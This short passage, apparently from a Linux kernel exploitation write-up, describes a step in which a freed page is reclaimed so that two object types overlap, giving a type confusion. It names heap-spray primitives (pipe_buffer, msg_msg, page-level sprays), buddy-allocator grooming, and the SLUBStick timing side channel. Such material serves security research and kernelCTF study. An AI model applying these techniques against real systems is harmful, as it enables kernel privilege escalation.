4.  Two object types now share one page, which is a type confusion.

Reclaim with pipe_buffer, msg_msg, or page-level sprays. The padding-spray variant pre-fills buddy freelists for determinism; SLUBStick drives the buddy-level reuse to high reliability with an allocator timing side channel. See d3kcache and the kernelCTF exploits below.
